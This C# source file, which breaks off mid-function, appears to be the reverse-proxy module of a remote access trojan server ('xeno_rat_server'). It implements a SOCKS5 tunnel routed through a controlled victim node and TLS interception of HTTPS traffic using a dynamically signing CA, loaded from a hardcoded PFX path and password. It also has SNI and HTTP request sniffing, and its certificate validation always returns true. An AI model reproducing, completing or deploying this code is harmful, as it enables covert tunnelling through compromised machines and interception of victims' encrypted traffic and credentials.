// Place this entire file content (namespace and class) into your project.
// Make sure your project language level is C# 7.3 and the project references support
// the System.Security.Cryptography.* APIs used here.
//
// Uses only C# 7.3 features (no target-typed new, no using declarations, no C# 8 features).

using BrotliSharpLib;
using System;
using System.Buffers;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Numerics;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TextBox;
using static xeno_rat_server.Forms.Reverse_Proxy;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        private Socket listenerSocket;
        private CancellationTokenSource _acceptCts;
        private Task _acceptLoopTask;
        private List<Node> activeSubnodes = new List<Node>();
        private X509Certificate2 serverCertificate;

        // Constants used in the class
        private const int UI_TRUNCATE_GLOBAL = 1200;
        private const int MAX_INSPECT_GLOBAL = 1024 * 1024;  
        // inside Reverse_Proxy class
        private DynamicCertSigner _signer;      // your dynamic signer type
        private MitmCertAuthority _authority;   // your authority wrapper type (if you use one)
                                                // add to class fields
        private MitmHandler _mitmHandler;

        public Reverse_Proxy(Node _client)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(OnClientDisconnect);

            // Try to load CA PFX and create MitmHandler (preferred: load from file so MitmHandler can import with EphemeralKeySet)
            try
            {
                // Change path/password to your actual myCA.pfx and password
                var caPath = @"C:\temp\mitmcerts\myCA.pfx";
                var caPassword = "ChangeMeStrong123";

                // Construct MitmHandler which will import the PFX with proper flags internally                      
                _mitmHandler = new MitmHandler(caPath, caPassword, msg => PostUi(msg));
                PostUi("MITM CA loaded for dynamic signing.");
            }
            catch (Exception ex)
            {
                _mitmHandler = null;
                PostUi("MITM CA load failed: " + ex.Message);
            }

            // Keep existing serverCertificate load if you also used a static serverCertificate elsewhere
            try
            {
                serverCertificate = new X509Certificate2(@"C:\temp\mitmcerts\myCA.pfx", "ChangeMeStrong123",
                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet);
            }
            catch (Exception errr)
            {
                serverCertificate = null;
                // We'll show a message in UI only when MITM attempted
            }

            var listViewContextMenu = new ContextMenuStrip();
            var copyItem = new ToolStripMenuItem("Copy Selected");
            copyItem.Click += copySelectedItemsToolStripMenuItem_Click;
            listViewContextMenu.Items.Add(copyItem);

            listView1.ContextMenuStrip = listViewContextMenu;
            listView1.MouseDown += ListView1_MouseDown;
        }


        private void OnClientDisconnect(Node node)
        {
            foreach (var n in activeSubnodes) n?.Disconnect();
            activeSubnodes.Clear();
            listenerSocket?.Close();
        }

        private async Task AcceptLoop(int port, CancellationToken token)
        {
            listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            listenerSocket.Listen(100);

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var clientSock = await listenerSocket.AcceptAsync();
                    _ = Task.Run(() => HandleClientSock(clientSock, token));
                }
                catch (ObjectDisposedException)
                {
                    break;
                }
                catch (SocketException)
                {
                    break;
                }
                catch (Exception ex)
                {
                    PostUi($"AcceptLoop error: {ex.Message}");
                }
            }
        }

        private async Task HandleClientSock(Socket clientSock, CancellationToken token)
        {
            try
            {
                if (!await StartNegotiation(clientSock)) return;
                await HandleConnect(clientSock);
            }
            catch (Exception ex)
            {
                try { clientSock.Close(); } catch { }
                PostUi($"HandleClientSock failed: {ex.Message}");
            }
        }

        private async Task HandleConnect(Socket clientSock)
        {
            try
            {
                byte[] header = await RecvAll(clientSock, 4);
                if (header == null || header.Length < 4)
                {
                    clientSock.Close();
                    return;
                }

                byte ver = header[0];
                byte cmd = header[1];
                byte rsv = header[2];
                byte addrType = header[3];

                if (ver != 5)
                {
                    await SendSocksReply(clientSock, 1);
                    clientSock.Close();
                    return;
                }

                if (cmd != 1 && cmd != 3)
                {
                    await SendSocksReply(clientSock, 7);
                    clientSock.Close();
                    return;
                }

                string destAddr = "";
                if (addrType == 1)
                {
                    byte[] ipBytes = await RecvAll(clientSock, 4);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = string.Join(".", ipBytes);
                }
                else if (addrType == 3)
                {
                    byte[] lenBuf = await RecvAll(clientSock, 1);
                    if (lenBuf == null) { clientSock.Close(); return; }
                    int len = lenBuf[0];

                    byte[] domainBytes = await RecvAll(clientSock, len);
                    if (domainBytes == null) { clientSock.Close(); return; }
                    destAddr = Encoding.ASCII.GetString(domainBytes);
                }
                else if (addrType == 4)
                {
                    byte[] ipBytes = await RecvAll(clientSock, 16);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = new IPAddress(ipBytes).ToString();
                }
                else
                {
                    await SendSocksReply(clientSock, 8);
                    clientSock.Close();
                    return;
                }

                byte[] portBytes = await RecvAll(clientSock, 2);
                if (portBytes == null) { clientSock.Close(); return; }
                int destPort = (portBytes[0] << 8) | portBytes[1];

                ListViewItem lvi = null;

                
                if (cmd == 3)
                {
                    UdpClient udpRelay = new UdpClient(0);
                    IPEndPoint localEp = (IPEndPoint)udpRelay.Client.LocalEndPoint;
                    await SendSocksReply(clientSock, 0, localEp.Address, (ushort)localEp.Port);

                    lvi = new ListViewItem($"UDP Relay {localEp.Address}:{localEp.Port}");
                    listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));

                    _ = Task.Run(() => HandleUdpRelay(udpRelay));
                    return;
                }
                else if (cmd == 1)
                {
                    await SendSocksReply(clientSock, 0);

                    lvi = new ListViewItem($"{destAddr}:{destPort}");
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add(lvi);
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));

                    bool attemptMitm = (destPort == 443 && serverCertificate != null && serverCertificate.HasPrivateKey);

                    if (attemptMitm)
                    {
                        _ = Task.Run(() => RelayLoopWithOptionalMitm(clientSock, destAddr, destPort, lvi, serverCertificate, true));
                    }
                    else
                    {
                        TcpClient remoteClient = new TcpClient();
                        try
                        {
                            await remoteClient.ConnectAsync(destAddr, destPort);
                        }
                        catch
                        {
                            await SendSocksReply(clientSock, 5);
                            clientSock.Close();
                            return;
                        }
                        _ = Task.Run(() => RelayLoop(clientSock, remoteClient, lvi));
                    }
                }
            }
            catch (Exception ex)
            {
                try { clientSock.Close(); } catch { }
                PostUi("HandleConnect exception: " + ex.Message);
            }
        }

        // ----------------------------------------------------------------------
        // Transparent fallback that replays prefixBytes to upstream when present.
        // This is similar to FallbackTransparent/TransparentTcpTunnel variants you already
        // used — include/replace with your existing implementation if you have one.
        // ----------------------------------------------------------------------
        private async Task TransparentTcpTunnel(Stream clientStream, string host, int port, CancellationToken ct)
        {
            // If clientStream is a PrependStream it will replay the captured bytes automatically.
            Stream streamForClient = clientStream;
            var ps = clientStream as PrependStream;
            if (ps != null) streamForClient = ps; // keep as is (it replays prefix)

            TcpClient upstream = null;
            NetworkStream upStream = null;
            try
            {
                upstream = new TcpClient();
                await upstream.ConnectAsync(host, port).ConfigureAwait(false);
                upStream = upstream.GetStream();
            }
            catch (Exception ex)
            {
                PostUi($"Transparent tunnel connect to {host}:{port} failed: {ex.Message}");
                try { streamForClient?.Close(); } catch { }
                try { upstream?.Close(); } catch { }
                return;
            }

            var linked = CancellationTokenSource.CreateLinkedTokenSource(ct);
            var t1 = RelayStreamAsync(streamForClient, upStream, linked.Token);
            var t2 = RelayStreamAsync(upStream, streamForClient, linked.Token);
            await Task.WhenAny(t1, t2).ConfigureAwait(false);
            try { linked.Cancel(); } catch { }
            try { await Task.WhenAll(t1, t2).ConfigureAwait(false); } catch { }
            try { upStream?.Close(); } catch { }
            try { upstream?.Close(); } catch { }
            try { streamForClient?.Close(); } catch { }
        }


        private static string DecompressIfNeeded(byte[] data, string encoding)
        {
            try
            {
                if (encoding == null)
                    return Encoding.UTF8.GetString(data);

                if (encoding.Contains("gzip"))
                {
                    using (var input = new MemoryStream(data))
                    using (var gzip = new System.IO.Compression.GZipStream(input, System.IO.Compression.CompressionMode.Decompress))
                    using (var output = new MemoryStream())
                    {
                        gzip.CopyTo(output);
                        return Encoding.UTF8.GetString(output.ToArray());
                    }
                }
                else if (encoding.Contains("deflate"))
                {
                    using (var input = new MemoryStream(data))
                    using (var deflate = new System.IO.Compression.DeflateStream(input, System.IO.Compression.CompressionMode.Decompress))
                    using (var output = new MemoryStream())
                    {
                        deflate.CopyTo(output);
                        return Encoding.UTF8.GetString(output.ToArray());
                    }
                }
                else
                {
                    // br/zstd not supported in .NET by default — just show raw length
                    return $"[Compressed content: {encoding}, {data.Length} bytes]";
                }
            }
            catch (Exception ex)
            {
                return $"[Decompression failed: {ex.Message}]";
            }
        }

        // ----------------------------------------------------------------------
        // Probe helper: attempts TLS1.3 then TLS1.2 handshakes and returns the
        // protocol the server actually negotiated, or SslProtocols.None on failure.
        // ----------------------------------------------------------------------
        private async Task<SslProtocols> ProbeUpstreamAsync(string host, int port, int timeoutMs = 3000)
        {
            if (string.IsNullOrEmpty(host)) throw new ArgumentNullException(nameof(host));

            // Try a handshake with the given protocol. Return the negotiated protocol or None.
            async Task<SslProtocols> TryHandshake(SslProtocols protocol)
            {
                TcpClient tcp = null;
                SslStream ssl = null;
                try
                {
                    tcp = new TcpClient();

                    var connectTask = tcp.ConnectAsync(host, port);
                    var winner = await Task.WhenAny(connectTask, Task.Delay(timeoutMs)).ConfigureAwait(false);
                    if (winner != connectTask)
                    {
                        try { tcp?.Close(); } catch { }
                        return SslProtocols.None;
                    }

                    var net = tcp.GetStream();
                    ssl = new SslStream(net, leaveInnerStreamOpen: false,
                        userCertificateValidationCallback: (sender, cert, chain, errors) => true);

                    var authTask = ssl.AuthenticateAsClientAsync(host, null, protocol, checkCertificateRevocation: false);
                    var authWinner = await Task.WhenAny(authTask, Task.Delay(timeoutMs)).ConfigureAwait(false);
                    if (authWinner != authTask)
                    {
                        try { ssl?.Close(); } catch { }
                        try { tcp?.Close(); } catch { }
                        return SslProtocols.None;
                    }

                    // If handshake succeeded, return negotiated protocol
                    return ssl.SslProtocol;
                }
                catch
                {
                    return SslProtocols.None;
                }
                finally
                {
                    try { ssl?.Close(); } catch { }
                    try { tcp?.Close(); } catch { }
                }
            }

            // 1) Try TLS1.3 first (if runtime supports it).
            try
            {
                var p13 = await TryHandshake(SslProtocols.Tls13).ConfigureAwait(false);
                if (p13 == SslProtocols.Tls13) return SslProtocols.Tls13;
                if (p13 == SslProtocols.Tls12) return SslProtocols.Tls12; // runtime negotiated 1.2 even though 1.3 was requested
            }
            catch { /* ignore */ }

            // 2) Try TLS1.2
            try
            {
                var p12 = await TryHandshake(SslProtocols.Tls12).ConfigureAwait(false);
                if (p12 == SslProtocols.Tls12) return SslProtocols.Tls12;
            }
            catch { /* ignore */ }

            // 3) Unknown / failed
            return SslProtocols.None;
        }

        // ----------------------------------------------------------------------
        // Relay loop that decides MITM vs transparent. Caller reads ClientHello,
        // probes upstream, then either calls HandleMitmAsync or does transparent.
        // ----------------------------------------------------------------------
        private async Task RelayLoopWithOptionalMitm(Socket clientSock, string destHost, int destPort, ListViewItem lvi, X509Certificate2 caPfx, bool enableMitm = true)
        {
            Action<string> PostUiLocal = (s) =>
            {
                try
                {
                    string show = s.Length > UI_TRUNCATE_GLOBAL ? s.Substring(0, UI_TRUNCATE_GLOBAL) + "…(truncated)" : s;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                    }));
                }
                catch { }
            };

            var clientNetStream = new NetworkStream(clientSock, ownsSocket: true);

            if (enableMitm && destPort == 443 && caPfx != null && caPfx.HasPrivateKey)
            {
                byte[] hello = null;
                try
                {
                    hello = await ReadClientHelloAsync(clientNetStream, 64 * 1024, 3000).ConfigureAwait(false);
                }
                catch (Exception ex)
                {
                    PostUiLocal($"Failed to read ClientHello: {ex.Message}");
                    try { clientSock.Close(); } catch { }
                    return;
                }

                string sni = TryParseSniFromClientHello(hello) ?? destHost;
                PostUiLocal($"ClientHello SNI parsed: {sni}");

                // Quick heuristic whether client advertises TLS1.3 (optional)
                bool clientAdvertsTls13 = false;
                try
                {
                    if (hello != null && hello.Length > 0)
                    {
                        for (int i = 0; i + 1 < hello.Length; i++)
                        {
                            if (hello[i] == 0x03 && hello[i + 1] == 0x04) { clientAdvertsTls13 = true; break; }
                        }
                    }
                }
                catch { clientAdvertsTls13 = false; }
                PostUiLocal($"Client advertises TLS1.3: {clientAdvertsTls13}");

                // Probe upstream
                SslProtocols serverSelectedProtocol = SslProtocols.None;
                try
                {
                    serverSelectedProtocol = await ProbeUpstreamAsync(sni, 443, 3000).ConfigureAwait(false);
                    if (serverSelectedProtocol == SslProtocols.None)
                        PostUiLocal($"Upstream probe to {sni}: inconclusive.");
                    else
                        PostUiLocal($"Upstream negotiated protocol for {sni}: {serverSelectedProtocol}");
                }
                catch (Exception ex)
                {
                    PostUiLocal($"Upstream probe failed for {sni}: {ex.Message}");
                    serverSelectedProtocol = SslProtocols.None;
                }

                // Make decision
                if (serverSelectedProtocol == SslProtocols.Tls13)
                {
                    PostUiLocal($"Server selected TLS1.3 for {sni}; skipping MITM and using transparent tunnel.");
                    using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
                    {
                        await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
                    }
                    return;
                }
                else if (serverSelectedProtocol == SslProtocols.Tls12)
                {
                    PostUiLocal($"Server selected TLS1.2 for {sni}; attempting MITM.");
                    using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
                    {
                        if (_mitmHandler != null)
                        {
                            // Call mitm handler; pass the probed serverSelectedProtocol
                            await _mitmHandler.HandleMitmAsync(prepend, sni, hello, serverSelectedProtocol, CancellationToken.None).ConfigureAwait(false);
                        }
                        else
                        {
                            await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
                        }
                    }
                    return;
                }
                else
                {
                    PostUiLocal($"Upstream probe inconclusive for {sni}; falling back to transparent tunnel.");
                    using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
                    {
                        await TransparentTcpTunnel(prepend, sni, 443, CancellationToken.None).ConfigureAwait(false);
                    }
                    return;
                }
            }

            // Non-MITM flow: plain TCP relay
            TcpClient remote = new TcpClient();
            try
            {
                await remote.ConnectAsync(destHost, destPort).ConfigureAwait(false);
            }
            catch (Exception ex)
            {
                PostUiLocal($"Remote connect failed: {ex.Message}");
                try { clientSock.Close(); } catch { }
                return;
            }

            var remoteStream = remote.GetStream();
            var relayCts = new CancellationTokenSource();

            var relay1 = RelayDataAsync(clientNetStream, remoteStream, destHost + " C->S", relayCts.Token);
            var relay2 = RelayDataAsync(remoteStream, clientNetStream, destHost + " S->C", relayCts.Token);

            await Task.WhenAny(relay1, relay2).ConfigureAwait(false);
            try { relayCts.Cancel(); } catch { }

            try { await Task.WhenAll(relay1, relay2).ConfigureAwait(false); } catch { }

            try { remote.Close(); } catch { }
            try { clientSock.Close(); } catch { }
        }

        private async Task RelayDataAsync(Stream src, Stream dst, string uiPrefix, CancellationToken ct)
        {
            const int BUF_SIZE = 16 * 1024;
            var buf = new byte[BUF_SIZE];
            try
            {
                while (!ct.IsCancellationRequested)
                {
                    int r = 0;
                    try
                    {
                        r = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
                    }
                    catch (OperationCanceledException) { break; }
                    catch (Exception ex)
                    {
                        // use your PostUi UI helper to report errors
                        PostUi($"{uiPrefix} read error: {ex.Message}");
                        break;
                    }

                    if (r <= 0) break;

                    try
                    {
                        await dst.WriteAsync(buf, 0, r, ct).ConfigureAwait(false);
                        await dst.FlushAsync(ct).ConfigureAwait(false);
                    }
                    catch (Exception ex)
                    {
                        PostUi($"{uiPrefix} write error: {ex.Message}");
                        break;
                    }
                }
            }
            finally
            {
                PostUi($"{uiPrefix} relay ended.");
            }
        }

        // A robust copy loop that uses the provided CancellationToken and flushes after writes.
        // This is safe for replaying a ClientHello at the start (PrependStream will supply it).
        private async Task RelayStreamAsync(Stream src, Stream dst, CancellationToken ct)
        {
            var buf = new byte[16 * 1024];
            try
            {
                while (!ct.IsCancellationRequested)
                {
                    int read;
                    try
                    {
                        read = await src.ReadAsync(buf, 0, buf.Length, ct).ConfigureAwait(false);
                    }
                    catch (OperationCanceledException) { break; }
                    catch (IOException) { break; }
                    catch (ObjectDisposedException) { break; }
                    catch (Exception ex)
                    {
                        PostUi($"RelayStream read failed: {ex.Message}");
                        break;
                    }

                    if (read <= 0) break;

                    try
                    {
                        await dst.WriteAsync(buf, 0, read, ct).ConfigureAwait(false);
                        // Try to flush ASAP so TLS handshake bytes are truly delivered without delay
                        try { await dst.FlushAsync(ct).ConfigureAwait(false); } catch { /* flush best effort */ }
                    }
                    catch (OperationCanceledException) { break; }
                    catch (Exception ex)
                    {
                        PostUi($"RelayStream write failed: {ex.Message}");
                        break;
                    }
                }
            }
            finally
            {
                try { dst.Flush(); } catch { }
            }
        }

        // PrependStream - replays a prefix then reads from the inner stream
        public class PrependStream : Stream
        {
            private readonly byte[] _prefix;
            private int _pos;
            private readonly Stream _inner;
            private readonly Action<string> _log;

            public PrependStream(byte[] prefix, Stream inner, Action<string> logger = null)
            {
                _prefix = prefix ?? new byte[0];
                _pos = 0;
                _inner = inner ?? throw new ArgumentNullException(nameof(inner));
                _log = logger ?? (_ => { });
            }

            // Expose the raw inner stream so fallback can use it directly
            public Stream InnerStream { get { return _inner; } }

            public override bool CanRead { get { return _inner.CanRead; } }
            public override bool CanSeek { get { return false; } }
            public override bool CanWrite { get { return _inner.CanWrite; } }
            public override long Length { get { throw new NotSupportedException(); } }
            public override long Position { get { throw new NotSupportedException(); } set { throw new NotSupportedException(); } }

            public override void Flush()
            {
                try { _inner.Flush(); }
                catch (Exception ex) { _log("PrependStream flush failed: " + ex.Message); throw; }
            }

            public override int Read(byte[] buffer, int offset, int count)
            {
                if (_pos < _prefix.Length)
                {
                    int n = Math.Min(count, _prefix.Length - _pos);
                    Buffer.BlockCopy(_prefix, _pos, buffer, offset, n);
                    _pos += n;
                    return n;
                }

                if (!_inner.CanRead) return 0;

                try
                {
                    return _inner.Read(buffer, offset, count);
                }
                catch (IOException ioEx)
                {
                    _log("PrependStream inner read failed: " + ioEx.Message);
                    return 0; // treat as EOF so caller can shutdown gracefully
                }
                catch (Exception ex)
                {
                    _log("PrependStream inner read failed: " + ex.Message);
                    return 0;
                }
            }

            public override async Task<int> ReadAsync(byte[] buffer, int offset, int count, CancellationToken cancellationToken)
            {
                if (_pos < _prefix.Length)
                {
                    int n = Math.Min(count, _prefix.Length - _pos);
                    Buffer.BlockCopy(_prefix, _pos, buffer, offset, n);
                    _pos += n;
                    return n;
                }

                if (!_inner.CanRead) return 0;

                try
                {
                    return await _inner.ReadAsync(buffer, offset, count, cancellationToken).ConfigureAwait(false);
                }
                catch (IOException ioEx)
                {
                    _log("PrependStream inner read failed (async): " + ioEx.Message);
                    return 0;
                }
                catch (OperationCanceledException) { return 0; }
                catch (Exception ex)
                {
                    _log("PrependStream inner read failed (async): " + ex.Message);
                    return 0;
                }
            }

            public override void Write(byte[] buffer, int offset, int count)
            {
                if (!_inner.CanWrite)
                {
                    _log("PrependStream inner not writable.");
                    throw new NotSupportedException("Inner stream not writable");
                }

                try
                {
                    _inner.Write(buffer, offset, count);
                }
                catch (Exception ex)
                {
                    _log("PrependStream inner write failed: " + ex.Message);
                    throw;
                }
            }

            public override long Seek(long offset, SeekOrigin origin) { throw new NotSupportedException(); }
            public override void SetLength(long value) { throw new NotSupportedException(); }

            protected override void Dispose(bool disposing)
            {
                base.Dispose(disposing);
                if (disposing)
                {
                    try { _inner.Dispose(); } catch { }
                }
            }
        }

        // Peek ClientHello from a connected Socket (does NOT consume bytes).
        // Returns the bytes read (up to maxBytes) or null on failure/timeout.
        private static async Task<byte[]> PeekClientHelloFromSocketAsync(Socket sock, int maxBytes = 64 * 1024, int timeoutMs = 3000)
        {
            if (sock == null) return null;
            var ms = new MemoryStream();
            var buffer = new byte[4096];
            var sw = Stopwatch.StartNew();
            try
            {
                // Keep peeking until we have at least record header (5 bytes) and full record
                while (ms.Length < 5 && sw.ElapsedMilliseconds < timeoutMs)
                {
                    // Socket.Receive can be used with Peek to avoid removing bytes from the socket
                    int got = 0;
                    try
                    {
                        got = sock.Receive(buffer, 0, Math.Min(buffer.Length, maxBytes - (int)ms.Length), SocketFlags.Peek);
                    }
                    catch (SocketException se) when (se.SocketErrorCode == SocketError.WouldBlock || se.SocketErrorCode == SocketError.TimedOut)
                    {
                        await Task.Delay(10).ConfigureAwait(false);
                        continue;
                    }

                    if (got <= 0)
                    {
                        // remote closed or no data yet
                        await Task.Delay(10).ConfigureAwait(false);
                        continue;
                    }

                    ms.Write(buffer, 0, got);

                    if (ms.Length >= 5)
                    {
                        // we know record length now, ensure we've peeked whole record (or up to maxBytes)
                        var arr = ms.ToArray();
                        int recLen = (arr[3] << 8) | arr[4];
                        int total = 5 + recLen;
                        if (ms.Length >= total || ms.Length >= maxBytes) break;
                    }

                    // small delay to allow more bytes to arrive (but break if timeout)
                    await Task.Delay(5).ConfigureAwait(false);
                }

                return ms.ToArray();
            }
            catch
            {
                return null;
            }
        }

        // Returns true if the ClientHello bytes advertise TLS 1.3 (supported_versions extension contains 0x0304)
        private static bool ClientHelloIndicatesTls13(byte[] hello)
        {
            if (hello == null || hello.Length < 5) return false;
            try
            {
                int pos = 0;
                if (hello[pos++] != 0x16) return false; // Handshake record
                pos += 2; // record version
                int recLen = (hello[pos] << 8) | hello[pos + 1]; pos += 2;
                if (pos + recLen > hello.Length) return false;
                // Handshake header
                byte hsType = hello[pos++];
                if (hsType != 0x01) return false;
                int hsLen = (hello[pos] << 16) | (hello[pos + 1] << 8) | hello[pos + 2]; pos += 3;
                int hsEnd = pos + hsLen;
                if (hsEnd > hello.Length) return false;

                // Skip legacy_version (2), random(32)
                pos += 2 + 32;
                if (pos >= hsEnd) return false;

                // SessionID
                int sessionIdLen = hello[pos++]; pos += sessionIdLen;
                if (pos >= hsEnd) return false;

                // CipherSuites
                int csLen = (hello[pos] << 8) | hello[pos + 1]; pos += 2 + csLen;
                if (pos >= hsEnd) return false;

                // Compression
                int compLen = hello[pos++]; pos += compLen;
                if (pos > hsEnd) return false;

                // Extensions
                if (pos + 2 > hsEnd) return false;
                int extLen = (hello[pos] << 8) | hello[pos + 1]; pos += 2;
                int extEnd = pos + extLen;
                if (extEnd > hsEnd) return false;

                while (pos + 4 <= extEnd)
                {
                    int extType = (hello[pos] << 8) | hello[pos + 1];
                    int extDataLen = (hello[pos + 2] << 8) | hello[pos + 3];
                    pos += 4;
                    if (pos + extDataLen > extEnd) break;

                    // supported_versions extension is 0x002b
                    if (extType == 0x002b)
                    {
                        // data: uint8 length, then list of versions (2 bytes each) OR for TLS1.3 client hello it is a uint8 list length then version entries
                        // RFC: in ClientHello, supported_versions extension data for TLS1.3 is: uint8 length; opaque versions<2..2^8-1>;
                        if (extDataLen >= 1)
                        {
                            int listLen = hello[pos];
                            int vpos = pos + 1;
                            int vend = pos + extDataLen;
                            while (vpos + 1 <= vend - 1)
                            {
                                var major = hello[vpos];
                                var minor = hello[vpos + 1];
                                // TLS1.3 version is 0x03 0x04
                                if (major == 0x03 && minor == 0x04) return true;
                                vpos += 2;
                            }
                        }
                    }

                    pos += extDataLen;
                }
            }
            catch { }
            return false;
        }

        private static async Task<byte[]> ReadClientHelloAsync(Stream net, int maxBytes = 64 * 1024, int timeoutMs = 3000)
        {
            var ms = new MemoryStream();
            var header = new byte[5];
            int got = 0;
            // Set ReadTimeout if NetworkStream
            try
            {
                var ns = net as NetworkStream;
                if (ns != null) ns.ReadTimeout = timeoutMs;
            }
            catch { }

            while (got < 5)
            {
                int r = await net.ReadAsync(header, got, 5 - got);
                if (r <= 0) return ms.ToArray();
                ms.Write(header, got, r);
                got += r;
            }
            int recLen = (header[3] << 8) | header[4];
            int toRead = Math.Min(recLen, maxBytes - (int)ms.Length);
            var tmp = new byte[4096];
            while (toRead > 0)
            {
                int r = await net.ReadAsync(tmp, 0, Math.Min(tmp.Length, toRead));
                if (r <= 0) break;
                ms.Write(tmp, 0, r);
                toRead -= r;
            }
            return ms.ToArray();
        }

        private static string TryParseSniFromClientHello(byte[] data)
        {
            try
            {
                if (data == null || data.Length < 5) return null;
                int pos = 0;
                if (data[pos++] != 0x16) return null;
                pos += 2;
                int recLen = (data[pos] << 8) | data[pos + 1]; pos += 2;
                if (pos + recLen > data.Length) return null;
                if (pos + 4 > data.Length) return null;
                byte hsType = data[pos++];
                if (hsType != 0x01) return null;
                int hsLen = (data[pos] << 16) | (data[pos + 1] << 8) | data[pos + 2]; pos += 3;
                pos += 2 + 32;
                int sessionIdLen = data[pos++]; pos += sessionIdLen;
                int csLen = (data[pos] << 8) | data[pos + 1]; pos += 2 + csLen;
                int compLen = data[pos++]; pos += compLen;
                if (pos + 2 > data.Length) return null;
                int extLen = (data[pos] << 8) | data[pos + 1]; pos += 2;
                int extEnd = pos + extLen;
                while (pos + 4 <= extEnd)
                {
                    int extType = (data[pos] << 8) | data[pos + 1];
                    int extLength = (data[pos + 2] << 8) | data[pos + 3];
                    pos += 4;
                    if (extType == 0x00 && pos + extLength <= extEnd)
                    {
                        int sPos = pos;
                        int listLen = (data[sPos] << 8) | data[sPos + 1]; sPos += 2;
                        int listEnd = sPos + listLen;
                        while (sPos + 3 <= listEnd)
                        {
                            byte nameType = data[sPos++];
                            int nameLen = (data[sPos] << 8) | data[sPos + 1];
                            sPos += 2;
                            if (nameType == 0 && sPos + nameLen <= listEnd)
                            {
                                return Encoding.ASCII.GetString(data, sPos, nameLen);
                            }
                            sPos += nameLen;
                        }
                        break;
                    }
                    pos += extLength;
                }
            }
            catch { }
            return null;
        }

        // ---------- RelayLoop (non-MITM path) ----------
        private async Task RelayLoop(Socket clientSock, TcpClient remoteClient, ListViewItem lvi)
        {
            var clientStream = new NetworkStream(clientSock, true);
            var remoteStream = remoteClient.GetStream();

            var clientToRemoteInspect = new MemoryStream();
            var remoteToClientInspect = new MemoryStream();
            bool sniFound = false;
            bool httpRequestShown = false;
            bool previewShownRemote = false;
            const int MAX_INSPECT = MAX_INSPECT_GLOBAL;
            const int UI_TRUNCATE_LOCAL = 1024;

            Action<string> PostUi = (text) =>
            {
                try
                {
                    string show = text.Length > UI_TRUNCATE_LOCAL ? text.Substring(0, UI_TRUNCATE_LOCAL) + "…(truncated)" : text;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                    }));
                }
                catch { }
            };

            void AppendInspect(MemoryStream ms, byte[] buf, int offset, int count)
            {
                if (ms.Length + count <= MAX_INSPECT)
                {
                    ms.Write(buf, offset, count);
                }
                else
                {
                    ms.SetLength(0);
                }
            }

            async Task CopyAndInspectAsync(Stream src, Stream dst, MemoryStream inspectBuffer, Action<byte[], int, int> inspector, CancellationToken ct)
            {
                var buf = new byte[16 * 1024];
                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        int r = await src.ReadAsync(buf, 0, buf.Length, ct);
                        if (r == 0) break;
                        await dst.WriteAsync(buf, 0, r, ct);
                        await dst.FlushAsync(ct);
                        try { inspector(buf, 0, r); } catch { }
                    }
                }
                catch { }
            }

            var cts = new CancellationTokenSource();

            try
            {
                void ClientToRemoteInspector(byte[] buf, int off, int len)
                {
                    AppendInspect(clientToRemoteInspect, buf, off, len);
                    if (!sniFound && clientToRemoteInspect.Length >= 5)
                    {
                        try
                        {
                            var arr = clientToRemoteInspect.ToArray();
                            var sni = TryParseSni(arr);
                            if (!string.IsNullOrEmpty(sni))
                            {
                                sniFound = true;
                                listView1?.BeginInvoke((MethodInvoker)(() =>
                                {
                                    if (lvi != null) lvi.Text = $"{lvi.Text} (SNI:{sni})";
                                }));
                                PostUi($"SNI: {sni}");
                            }
                        }
                        catch { }
                    }

                    if (!httpRequestShown)
                    {
                        try
                        {
                            var arr = clientToRemoteInspect.ToArray();
                            string maybeText = null;
                            try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }
                            if (!string.IsNullOrEmpty(maybeText))
                            {
                                int he = maybeText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                                if (he >= 0)
                                {
                                    string headers = maybeText.Substring(0, he);
                                    var lines = headers.Split(new[] { "\r\n" }, StringSplitOptions.None);
                                    if (lines.Length > 0)
                                    {
                                        string reqLine = lines[0];
                                        var parts = reqLine.Split(' ');
                                        if (parts.Length >= 2)
                                        {
                                            string method = parts[0];
                                            string target = parts[1];
                                            string host = null;
                                            foreach (var l in lines.Skip(1))
                                            {
                                                int c = l.IndexOf(':');
                                                if (c > 0)
                                                {
                                                    string name = l.Substring(0, c).Trim();
                                                    if (string.Equals(name, "Host", StringComparison.OrdinalIgnoreCase))
                                                    {
                                                        host = l.Substring(c + 1).Trim();
                                                        break;
                                                    }
                                                }
                                            }

                                            if (!string.IsNullOrEmpty(host))
                                            {
